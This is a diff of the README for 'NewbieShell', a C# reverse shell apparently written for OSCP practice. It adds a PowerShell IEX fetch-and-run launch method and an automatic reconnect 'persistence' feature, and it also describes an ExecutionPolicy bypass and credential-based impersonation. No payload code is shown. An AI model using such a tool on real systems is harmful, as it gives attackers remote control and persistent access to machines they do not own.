@@ -1,12 +1,11 @@
 # NewbieShell
 ## Reverse shell for beginners
 
-When preparing for the OSCP certificate, I mostly used Netcat and a msfvenom payload for a connection. The most annoying thing for me was that when downloading and uploading software, it required a very long text. Since I like to program in C#, I thought I would just simplify this for myself. Through this idea the NewbieShell was born. The goal was to execute code with short keywords, like download. This saves the attacker time and nerves. 
-Furthermore, as the name "NewbieShell" suggests, this software is also intended for beginners. 
+When preparing for the OSCP certificate, I mostly used Netcat and an msfvenom payload for a connection. The most annoying thing for me was that downloading and uploading software required a very long text. Furthermore, when the connection was interrupted, I had to rebuild the connection most of the time. Since I like to program in C#, I thought I could simplify this. With this idea the NewbieShell was born. The goal was to execute code with short keywords, like download. This saves the attacker time and nerves. Moreover, as the name "NewbieShell" suggests, this software is also intended for beginners. 
 
 ## Usage
 
-There are two ways to use NewbieShell. The simple method in the Console.
+There are three ways to use NewbieShell. The simple method in the Console.
 
 ```
 NewbieShell.exe
@@ -23,6 +22,8 @@ Newbieshell.exe <ip> <port> <cmd.exe or powershell.exe>
 Example: NewbieShell.exe 192.168.0.1 80 cmd.exe
 
 If Powershell.exe is executed, then NewbieShell executes the command "-ep bypass" in the background. This sets the ExecutionPolicy to bypass.
+
+The third option is via a ps1 file. It is possible to run a web server on the attacker machine and then execute the code with the Powershell IEX command. Please note that in this option the IP address and the port on the ps1 file should be changed.
 
 ### NewbieShell Console
 All Windows commands can be inserted normally. For example, if you want to download something from a web server, then you have the possibility to execute a download with so-called keywords. The keyword for download is #D
@@ -72,7 +73,11 @@ NewbieShell requests the full path of the file. After a successful upload, the f
 #### Impersonation - Keyword #I
 
 If you have found any credentials during the attack, you have the possibility to generate a new shell with these credentials using NewbieShell.
-The system will ask for the username, password and domain. If there is no domain, this line can be left blank. 
+The system will ask for the username, password and domain. If there is no domain, this line can be left blank.
+
+#### Persistence - Keyword #P
+
+After a disconnection, the program tries to reconnect to the attacker. A timeout period can be defined for this. After this time the program sends a new request to the attacker.
 
 ## Future
 
